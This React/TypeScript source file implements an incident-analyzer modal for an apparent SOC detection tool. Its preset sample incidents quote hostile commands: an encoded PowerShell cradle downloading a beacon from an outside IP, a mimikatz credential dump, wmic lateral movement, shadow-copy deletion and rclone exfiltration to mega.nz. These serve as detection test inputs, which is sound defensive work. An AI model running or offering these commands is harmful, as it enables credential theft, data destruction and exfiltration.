import React, { useState } from 'react';
import { motion } from 'framer-motion';
import {
  ShieldAlert,
  Zap,
  RotateCcw,
  Sparkles,
  ExternalLink,
  PlusCircle,
  Hash,
  Layers,
  FileText
} from 'lucide-react';
import {
  analyzeIncidentText,
  type DetectionResult,
} from '../engine/detectionEngine';
import type { Incident, Severity, AttackStage } from '../types/index';

interface Props {
  isOpen: boolean;
  onClose: () => void;
  onLoadIncident: (incident: Incident) => void;
}

const PRESET_INCIDENTS = [
  {
    name: 'Phishing & PowerShell C2 Beacon',
    category: 'Phishing + Execution',
    text: `On 2024-03-15 at 08:22 UTC, employee received a spear-phishing email containing malicious attachment 'Q1_Financial_Report.xlsm' from spoofed address invoice-update@finance-corp[.]net. The user enabled macros, which triggered a VBA script executing an obfuscated PowerShell command: powershell -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTg1LjIyMC4xMDEuNTo4MDgwL2JlYWNvbi5wczEnKQ==. This downloaded a Cobalt Strike stageless beacon from C2 server 185.220.101.5:8080. The process injected into svchost.exe (PID 4412) and established persistence via HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinUpdate.`,
  },
  {
    name: 'LSASS Dump & Lateral Movement',
    category: 'Credential Theft + Lateral Movement',
    text: `Endpoint detection alert: Attacker executed mimikatz.exe sekurlsa::logonpasswords on domain controller DC-01 (10.0.1.5) to perform LSASS memory credential dumping. Extracted NTLM hash 8846f7eaee8fb117ad06bdd830b7586c for account Administrator. The attacker utilized Pass-the-Hash with wmic /node:10.0.2.10 process call create to pivot laterally across the subnet and spawn remote cmd.exe sessions on file server FS-PROD-01.`,
  },
  {
    name: 'Ransomware Impact & Data Exfiltration',
    category: 'Ransomware + Exfiltration',
    text: `Major incident reported: High-volume data exfiltration detected where 85 GB of sensitive CAD files and source code were compressed using 7z.exe with AES-256 encryption into archive 'backup_vault.7z' (SHA256: 4a9f8e12b7405cb19e830f...). Files were exfiltrated via mega.nz cloud storage endpoint 198.51.100.42 over TLS on port 443. Subsequently, LockBit ransomware executed, wiping backup shadow copies using 'vssadmin delete shadows /all /quiet' and 'wbadmin delete catalog -quiet', appending the .lockbit extension and displaying README_RESTORE_FILES.txt ransom note demanding 50 BTC.`,
  },
  {
    name: 'Cloud Storage Exfiltration & Brute Force',
    category: 'Data Exfiltration + Initial Access',
    text: `External SOC alert: Multiple failed login attempts (over 450 brute force credential stuffing attempts in 10 minutes) detected against VPN gateway 203.0.113.88 targeting user account jdoe. Following successful authentication bypass, automated rclone script initiated suspicious external connection transferring customer records to mega.nz and pastebin.com/raw/x84jdf. Exfiltrated files include customers_export_2024.zip.`,
  },
];

const STAGE_COLORS: Record<AttackStage, { bg: string; text: string; border: string }> = {
  reconnaissance: { bg: 'rgba(59,130,246,0.15)', text: '#60a5fa', border: '#1d4ed8' },
  initial_access: { bg: 'rgba(234,179,8,0.15)', text: '#facc15', border: '#ca8a04' },
  execution: { bg: 'rgba(249,115,22,0.15)', text: '#fb923c', border: '#ea580c' },
  persistence: { bg: 'rgba(168,85,247,0.15)', text: '#c084fc', border: '#9333ea' },
  privilege_escalation: { bg: 'rgba(236,72,153,0.15)', text: '#f472b6', border: '#db2777' },
  lateral_movement: { bg: 'rgba(14,165,233,0.15)', text: '#38bdf8', border: '#0284c7' },
  exfiltration: { bg: 'rgba(239,68,68,0.15)', text: '#f87171', border: '#dc2626' },
  impact: { bg: 'rgba(220,38,38,0.25)', text: '#ef4444', border: '#b91c1c' },
};

const SEVERITY_COLORS: Record<Severity, { bg: string; text: string; border: string }> = {
  critical: { bg: 'rgba(220,38,38,0.2)', text: '#f87171', border: '#ef4444' },
  high: { bg: 'rgba(234,88,12,0.2)', text: '#fb923c', border: '#f97316' },
  medium: { bg: 'rgba(234,179,8,0.2)', text: '#facc15', border: '#eab308' },
  low: { bg: 'rgba(34,197,94,0.2)', text: '#4ade80', border: '#22c55e' },
};

export const IncidentAnalyzerModal: React.FC<Props> = ({ isOpen, onClose, onLoadIncident }) => {
  const [inputText, setInputText] = useState(PRESET_INCIDENTS[0].text);
  const [result, setResult] = useState<DetectionResult | null>(null);
  const [isAnalyzing, setIsAnalyzing] = useState(false);
  const [activeTab, setActiveTab] = useState<'events' | 'matches' | 'iocs'>('events');

  if (!isOpen) return null;

  const handleAnalyze = () => {
    if (!inputText.trim()) return;
    setIsAnalyzing(true);
    setTimeout(() => {
      const detection = analyzeIncidentText(inputText);
      setResult(detection);
      setIsAnalyzing(false);
    }, 280);
  };

  const handleLoadAsIncident = () => {
    if (!result || result.events.length === 0) return;

    const newIncident: Incident = {
      id: `INC-DET-${Date.now().toString().slice(-4)}`,
      title: result.matches[0]?.rule.name || 'Automated Telemetry Analysis',
      description: result.summary,
      severity: result.overallSeverity,
      date: new Date().toISOString(),
      analyst: 'Detection Engine (Automated)',
      status: 'investigating',
      affectedSystems: ['Telemetry Endpoint', 'Security Perimeter'],
      timeline: result.events,
      response: {
        immediate: [
          'Isolate affected host(s) from production network',
          'Revoke active session tokens and force password resets',
          'Block all extracted external IPs and C2 domains at perimeter firewalls',
        ],
        shortTerm: [
          'Perform forensic memory analysis for injected payloads',
          'Audit Active Directory and Kerberos logs for lateral traversal',
          'Scan perimeter endpoints for matched indicators of compromise',
        ],
        longTerm: [
          'Deploy behavioral EDR prevention rules for script execution',
          'Strengthen MFA policies and privileged access management (PAM)',
          'Conduct organization-wide security awareness training',
        ],
      },
      education: {
        title: `MITRE ATT&CK Analysis: ${result.threatCategories.join(', ').toUpperCase()}`,
        explanation: result.summary,
        references: result.matches.map((m) => m.rule.mitreUrl).filter(Boolean),
      },
    };

    onLoadIncident(newIncident);
    onClose();
  };

  // Extract all indicators across all matches
  const allIocs = result
    ? [...new Set(result.matches.flatMap((m) => m.extractedIndicators))]
    : [];

  return (
    <div
      style={{
        position: 'fixed',
        inset: 0,
        backgroundColor: 'rgba(2, 8, 20, 0.85)',
        backdropFilter: 'blur(8px)',
        zIndex: 100,
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '20px',
      }}
    >
      <motion.div
        initial={{ opacity: 0, scale: 0.95, y: 15 }}
        animate={{ opacity: 1, scale: 1, y: 0 }}
        exit={{ opacity: 0, scale: 0.95, y: 15 }}
        transition={{ duration: 0.2 }}
        style={{
          width: '100%',
          maxWidth: '1100px',
          maxHeight: '92vh',
          backgroundColor: '#071628',
          border: '1px solid #1a3a5c',
          borderRadius: '12px',
          boxShadow: '0 25px 60px -15px rgba(0, 0, 0, 0.7), 0 0 30px rgba(59, 130, 246, 0.15)',
          display: 'flex',
          flexDirection: 'column',
          overflow: 'hidden',
        }}
      >
        {/* Header */}
        <div
          style={{
            padding: '16px 20px',
            borderBottom: '1px solid #1a3a5c',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'space-between',
            background: 'linear-gradient(90deg, rgba(7,22,40,1) 0%, rgba(13,37,66,0.6) 100%)',
          }}
        >
          <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
            <div
              style={{
                width: '36px',
                height: '36px',
                borderRadius: '8px',
                background: 'rgba(59, 130, 246, 0.15)',
                border: '1px solid rgba(59, 130, 246, 0.3)',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
              }}
            >
              <Sparkles size={18} color="#60a5fa" />
            </div>
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                <h2 style={{ margin: 0, fontSize: '16px', fontWeight: 700, color: '#f1f5f9', letterSpacing: '0.02em' }}>
                  TraceLens Detection & Threat Correlation Engine
                </h2>
                <span
                  style={{
                    fontSize: '10px',
                    fontFamily: 'JetBrains Mono, monospace',
                    background: 'rgba(59, 130, 246, 0.2)',
                    color: '#93c5fd',
                    padding: '2px 6px',
                    borderRadius: '4px',
                    border: '1px solid rgba(59, 130, 246, 0.4)',
                  }}
                >
                  TypeScript Engine v2.0
                </span>
              </div>
              <p style={{ margin: 0, fontSize: '11px', color: '#94a3b8' }}>
                Automated multi-stage incident parser: Phishing · Credential Theft · PowerShell · Suspicious Connections · Ransomware · Exfiltration
              </p>
            </div>
          </div>

          <button
            onClick={onClose}
            style={{
              background: 'transparent',
              border: '1px solid #1a3a5c',
              borderRadius: '6px',
              color: '#94a3b8',
              cursor: 'pointer',
              padding: '6px 12px',
              fontSize: '12px',
              display: 'flex',
              alignItems: 'center',
              gap: '4px',
              transition: 'all 0.15s ease',
            }}
            onMouseEnter={(e) => {
              e.currentTarget.style.color = '#fff';
              e.currentTarget.style.borderColor = '#3b82f6';
            }}
            onMouseLeave={(e) => {
              e.currentTarget.style.color = '#94a3b8';
              e.currentTarget.style.borderColor = '#1a3a5c';
            }}
          >
            Esc Close
          </button>
        </div>

        {/* Body content */}
        <div style={{ display: 'flex', flex: 1, overflow: 'hidden', minHeight: '520px' }}>
          {/* Left panel: Input and presets */}
          <div
            style={{
              width: '46%',
              borderRight: '1px solid #1a3a5c',
              display: 'flex',
              flexDirection: 'column',
              padding: '16px',
              background: 'rgba(4, 13, 26, 0.4)',
              overflowY: 'auto',
            }}
          >
            {/* Presets */}
            <div style={{ marginBottom: '14px' }}>
              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '8px' }}>
                <span style={{ fontSize: '11px', fontWeight: 600, color: '#94a3b8', textTransform: 'uppercase', letterSpacing: '0.05em' }}>
                  Telemetry Presets
                </span>
                <span style={{ fontSize: '10px', color: '#64748b' }}>Select scenario to load</span>
              </div>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px' }}>
                {PRESET_INCIDENTS.map((preset, idx) => (
                  <button
                    key={idx}
                    onClick={() => {
                      setInputText(preset.text);
                      setResult(null);
                    }}
                    style={{
                      background: inputText === preset.text ? 'rgba(59, 130, 246, 0.15)' : 'rgba(7, 22, 40, 0.6)',
                      border: inputText === preset.text ? '1px solid #3b82f6' : '1px solid #1a3a5c',
                      borderRadius: '6px',
                      padding: '8px 10px',
                      textAlign: 'left',
                      cursor: 'pointer',
                      transition: 'all 0.15s ease',
                    }}
                  >
                    <div style={{ fontSize: '11px', fontWeight: 600, color: inputText === preset.text ? '#60a5fa' : '#e2e8f0', marginBottom: '2px' }}>
                      {preset.name}
                    </div>
                    <div style={{ fontSize: '9px', color: '#64748b', fontFamily: 'JetBrains Mono, monospace' }}>
                      {preset.category}
                    </div>
                  </button>
                ))}
              </div>
            </div>

            {/* Input textarea */}
            <div style={{ flex: 1, display: 'flex', flexDirection: 'column' }}>
              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '6px' }}>
                <label style={{ fontSize: '11px', fontWeight: 600, color: '#94a3b8', textTransform: 'uppercase', letterSpacing: '0.05em', display: 'flex', alignItems: 'center', gap: '6px' }}>
                  <FileText size={12} color="#60a5fa" />
                  Raw Incident Report / SOC Logs
                </label>
                <span style={{ fontSize: '10px', color: '#64748b', fontFamily: 'JetBrains Mono, monospace' }}>
                  {inputText.length} chars
                </span>
              </div>
              <textarea
                value={inputText}
                onChange={(e) => setInputText(e.target.value)}
                placeholder="Paste SIEM logs, EDR alerts, firewall events, or investigator notes here..."
                style={{
                  flex: 1,
                  minHeight: '220px',
                  width: '100%',
                  background: '#040d1a',
                  border: '1px solid #1a3a5c',
                  borderRadius: '6px',
                  padding: '12px',
                  color: '#e2e8f0',
                  fontSize: '12px',
                  fontFamily: 'JetBrains Mono, monospace',
                  lineHeight: '1.5',
                  resize: 'none',
                  outline: 'none',
                }}
              />
            </div>

            {/* Action buttons */}
            <div style={{ display: 'flex', gap: '10px', marginTop: '14px' }}>
              <motion.button
                whileHover={{ scale: 1.02 }}
                whileTap={{ scale: 0.98 }}
                onClick={handleAnalyze}
                disabled={isAnalyzing || !inputText.trim()}
                style={{
                  flex: 1,
                  background: 'linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%)',
                  border: '1px solid #3b82f6',
                  borderRadius: '6px',
                  color: '#ffffff',
                  padding: '10px',
                  fontSize: '12px',
                  fontWeight: 600,
                  cursor: isAnalyzing || !inputText.trim() ? 'not-allowed' : 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: '8px',
                  boxShadow: '0 4px 14px rgba(37, 99, 235, 0.3)',
                }}
              >
                {isAnalyzing ? (
                  <>
                    <RotateCcw className="animate-spin" size={14} /> Correlating Indicators...
                  </>
                ) : (
                  <>
                    <Zap size={14} /> Run Detection Engine
                  </>
                )}
              </motion.button>

              <button
                onClick={() => {
                  setInputText('');
                  setResult(null);
                }}
                style={{
                  background: 'transparent',
                  border: '1px solid #1a3a5c',
                  borderRadius: '6px',
                  color: '#94a3b8',
                  padding: '10px 14px',
                  fontSize: '12px',
                  cursor: 'pointer',
                }}
              >
                Clear
              </button>
            </div>
          </div>

          {/* Right panel: Analysis & Extracted Events */}
          <div
            style={{
              width: '54%',
              display: 'flex',
              flexDirection: 'column',
              background: '#051221',
              overflowY: 'auto',
            }}
          >
            {result ? (
              <div style={{ display: 'flex', flexDirection: 'column', height: '100%' }}>
                {/* Summary bar */}
                <div
                  style={{
                    padding: '14px 18px',
                    borderBottom: '1px solid #1a3a5c',
                    background: 'rgba(7, 22, 40, 0.7)',
                  }}
                >
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '10px' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                      <span
                        style={{
                          fontSize: '11px',
                          fontWeight: 700,
                          textTransform: 'uppercase',
                          padding: '3px 8px',
                          borderRadius: '4px',
                          background: SEVERITY_COLORS[result.overallSeverity].bg,
                          color: SEVERITY_COLORS[result.overallSeverity].text,
                          border: `1px solid ${SEVERITY_COLORS[result.overallSeverity].border}`,
                        }}
                      >
                        {result.overallSeverity} Severity
                      </span>
                      <span style={{ fontSize: '12px', fontWeight: 600, color: '#e2e8f0' }}>
                        {result.matchCount} Rule Matches Found
                      </span>
                    </div>

                    <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                      <span style={{ fontSize: '10px', color: '#94a3b8' }}>Confidence:</span>
                      <span
                        style={{
                          fontSize: '12px',
                          fontWeight: 700,
                          fontFamily: 'JetBrains Mono, monospace',
                          color: result.overallConfidence >= 80 ? '#4ade80' : result.overallConfidence >= 50 ? '#facc15' : '#f87171',
                        }}
                      >
                        {result.overallConfidence}%
                      </span>
                    </div>
                  </div>

                  {/* Threat categories */}
                  <div style={{ display: 'flex', flexWrap: 'wrap', gap: '6px', marginBottom: '10px' }}>
                    {result.threatCategories.map((cat, idx) => (
                      <span
                        key={idx}
                        style={{
                          fontSize: '10px',
                          background: 'rgba(59, 130, 246, 0.15)',
                          color: '#93c5fd',
                          border: '1px solid rgba(59, 130, 246, 0.3)',
                          padding: '2px 8px',
                          borderRadius: '12px',
                          fontFamily: 'JetBrains Mono, monospace',
                          textTransform: 'uppercase',
                        }}
                      >
                        #{cat.replace('_', ' ')}
                      </span>
                    ))}
                  </div>

                  {/* Summary narrative */}
                  <p style={{ margin: 0, fontSize: '11px', color: '#94a3b8', lineHeight: '1.4' }}>
                    {result.summary}
                  </p>
                </div>

                {/* Tab selector */}
                <div
                  style={{
                    display: 'flex',
                    borderBottom: '1px solid #1a3a5c',
                    background: 'rgba(4, 13, 26, 0.4)',
                    padding: '0 16px',
                  }}
                >
                  <button
                    onClick={() => setActiveTab('events')}
                    style={{
                      background: 'none',
                      border: 'none',
                      borderBottom: activeTab === 'events' ? '2px solid #3b82f6' : '2px solid transparent',
                      color: activeTab === 'events' ? '#60a5fa' : '#64748b',
                      fontSize: '11px',
                      fontWeight: 600,
                      padding: '10px 14px',
                      cursor: 'pointer',
                      display: 'flex',
                      alignItems: 'center',
                      gap: '6px',
                    }}
                  >
                    <Layers size={13} /> Structured Timeline Events ({result.events.length})
                  </button>
                  <button
                    onClick={() => setActiveTab('matches')}
                    style={{
                      background: 'none',
                      border: 'none',
                      borderBottom: activeTab === 'matches' ? '2px solid #3b82f6' : '2px solid transparent',
                      color: activeTab === 'matches' ? '#60a5fa' : '#64748b',
                      fontSize: '11px',
                      fontWeight: 600,
                      padding: '10px 14px',
                      cursor: 'pointer',
                      display: 'flex',
                      alignItems: 'center',
                      gap: '6px',
                    }}
                  >
                    <ShieldAlert size={13} /> MITRE Matches ({result.matches.length})
                  </button>
                  <button
                    onClick={() => setActiveTab('iocs')}
                    style={{
                      background: 'none',
                      border: 'none',
                      borderBottom: activeTab === 'iocs' ? '2px solid #3b82f6' : '2px solid transparent',
                      color: activeTab === 'iocs' ? '#60a5fa' : '#64748b',
                      fontSize: '11px',
                      fontWeight: 600,
                      padding: '10px 14px',
                      cursor: 'pointer',
                      display: 'flex',
                      alignItems: 'center',
                      gap: '6px',
                    }}
                  >
                    <Hash size={13} /> Extracted IoCs ({allIocs.length})
                  </button>
                </div>

                {/* Tab content */}
                <div style={{ flex: 1, overflowY: 'auto', padding: '16px' }}>
                  {activeTab === 'events' && (
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                      {result.events.map((event) => {
                        const stageColor = STAGE_COLORS[event.stage] || STAGE_COLORS.initial_access;
                        return (
                          <div
                            key={event.id}
                            style={{
                              background: 'rgba(7, 22, 40, 0.8)',
                              border: '1px solid #1a3a5c',
                              borderRadius: '8px',
                              padding: '12px',
                            }}
                          >
                            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '6px' }}>
                              <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                                <span
                                  style={{
                                    fontSize: '9px',
                                    fontWeight: 700,
                                    textTransform: 'uppercase',
                                    padding: '2px 6px',
                                    borderRadius: '4px',
                                    background: stageColor.bg,
                                    color: stageColor.text,
                                    border: `1px solid ${stageColor.border}`,
                                  }}
                                >
                                  {event.stage.replace('_', ' ')}
                                </span>
                                <span style={{ fontSize: '12px', fontWeight: 600, color: '#f1f5f9' }}>
                                  {event.title}
                                </span>
                              </div>
                              <span
                                style={{
                                  fontSize: '10px',
                                  fontFamily: 'JetBrains Mono, monospace',
                                  color: '#38bdf8',
                                  background: 'rgba(14, 165, 233, 0.1)',
                                  padding: '1px 5px',
                                  borderRadius: '3px',
                                }}
                              >
                                {event.mitre}
                              </span>
                            </div>

                            <p style={{ margin: '0 0 8px 0', fontSize: '11px', color: '#94a3b8', lineHeight: '1.4' }}>
                              {event.description}
                            </p>

                            {event.indicators && event.indicators.length > 0 && (
                              <div style={{ display: 'flex', flexWrap: 'wrap', gap: '4px' }}>
                                {event.indicators.map((ioc, i) => (
                                  <span
                                    key={i}
                                    style={{
                                      fontSize: '9px',
                                      fontFamily: 'JetBrains Mono, monospace',
                                      background: 'rgba(15, 23, 42, 0.8)',
                                      color: '#a5f3fc',
                                      border: '1px solid #1e3a5f',
                                      padding: '2px 6px',
                                      borderRadius: '3px',
                                    }}
                                  >
                                    {ioc}
                                  </span>
                                ))}
                              </div>
                            )}
                          </div>
                        );
                      })}
                    </div>
                  )}

                  {activeTab === 'matches' && (
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                      {result.matches.map((m, idx) => (
                        <div
                          key={idx}
                          style={{
                            background: 'rgba(7, 22, 40, 0.8)',
                            border: '1px solid #1a3a5c',
                            borderRadius: '8px',
                            padding: '12px',
                          }}
                        >
                          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '6px' }}>
                            <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                              <span style={{ fontSize: '11px', fontWeight: 600, color: '#f1f5f9' }}>
                                {m.rule.name}
                              </span>
                              <span style={{ fontSize: '10px', color: '#64748b', fontFamily: 'JetBrains Mono, monospace' }}>
                                ({m.rule.id})
                              </span>
                            </div>
                            <a
                              href={m.rule.mitreUrl}
                              target="_blank"
                              rel="noreferrer"
                              style={{
                                fontSize: '10px',
                                color: '#60a5fa',
                                display: 'flex',
                                alignItems: 'center',
                                gap: '3px',
                                textDecoration: 'none',
                              }}
                            >
                              {m.rule.mitre} <ExternalLink size={10} />
                            </a>
                          </div>
                          <div style={{ fontSize: '10px', color: '#64748b', marginBottom: '6px' }}>
                            Confidence: <strong style={{ color: '#93c5fd' }}>{m.confidence}%</strong> · Patterns matched: {m.matchedPatterns.length}
                          </div>
                          <div style={{ fontSize: '10px', fontFamily: 'JetBrains Mono, monospace', color: '#94a3b8', background: '#030a14', padding: '6px 8px', borderRadius: '4px' }}>
                            {m.matchedPatterns.slice(0, 2).join(' | ')}
                          </div>
                        </div>
                      ))}
                    </div>
                  )}

                  {activeTab === 'iocs' && (
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                      {allIocs.length > 0 ? (
                        allIocs.map((ioc, idx) => (
                          <div
                            key={idx}
                            style={{
                              display: 'flex',
                              alignItems: 'center',
                              justifyContent: 'space-between',
                              background: 'rgba(7, 22, 40, 0.8)',
                              border: '1px solid #1a3a5c',
                              padding: '8px 12px',
                              borderRadius: '6px',
                            }}
                          >
                            <span style={{ fontSize: '11px', fontFamily: 'JetBrains Mono, monospace', color: '#38bdf8' }}>
                              {ioc}
                            </span>
                            <span style={{ fontSize: '9px', color: '#64748b', background: '#0b1f36', padding: '2px 6px', borderRadius: '3px' }}>
                              Telemetry IoC
                            </span>
                          </div>
                        ))
                      ) : (
                        <div style={{ textAlign: 'center', padding: '30px', color: '#64748b', fontSize: '12px' }}>
                          No explicit IoC patterns extracted from current text.
                        </div>
                      )}
                    </div>
                  )}
                </div>

                {/* Footer action */}
                <div
                  style={{
                    padding: '12px 18px',
                    borderTop: '1px solid #1a3a5c',
                    background: 'rgba(7, 22, 40, 0.95)',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'space-between',
                  }}
                >
                  <span style={{ fontSize: '11px', color: '#94a3b8' }}>
                    Ready to visualize in SOC workspace?
                  </span>
                  <motion.button
                    whileHover={{ scale: 1.02 }}
                    whileTap={{ scale: 0.98 }}
                    onClick={handleLoadAsIncident}
                    style={{
                      background: 'linear-gradient(135deg, #10b981 0%, #059669 100%)',
                      border: '1px solid #34d399',
                      borderRadius: '6px',
                      color: '#ffffff',
                      padding: '8px 16px',
                      fontSize: '12px',
                      fontWeight: 600,
                      cursor: 'pointer',
                      display: 'flex',
                      alignItems: 'center',
                      gap: '6px',
                      boxShadow: '0 4px 12px rgba(16, 185, 129, 0.3)',
                    }}
                  >
                    <PlusCircle size={14} /> Load into Investigation Workspace
                  </motion.button>
                </div>
              </div>
            ) : (
              <div
                style={{
                  display: 'flex',
                  flexDirection: 'column',
                  alignItems: 'center',
                  justifyContent: 'center',
                  height: '100%',
                  padding: '30px',
                  textAlign: 'center',
                }}
              >
                <div
                  style={{
                    width: '56px',
                    height: '56px',
                    borderRadius: '12px',
                    background: 'rgba(59, 130, 246, 0.08)',
                    border: '1px solid rgba(59, 130, 246, 0.2)',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    marginBottom: '16px',
                  }}
                >
                  <ShieldAlert size={28} color="#3b82f6" />
                </div>
                <h3 style={{ margin: '0 0 6px 0', fontSize: '14px', fontWeight: 600, color: '#e2e8f0' }}>
                  Awaiting Incident Telemetry
                </h3>
                <p style={{ margin: 0, fontSize: '12px', color: '#64748b', maxWidth: '340px', lineHeight: '1.5' }}>
                  Select one of the telemetry presets on the left or paste your own raw incident report, then click <strong>Run Detection Engine</strong>.
                </p>
              </div>
            )}
          </div>
        </div>
      </motion.div>
    </div>
  );
};

export default IncidentAnalyzerModal;
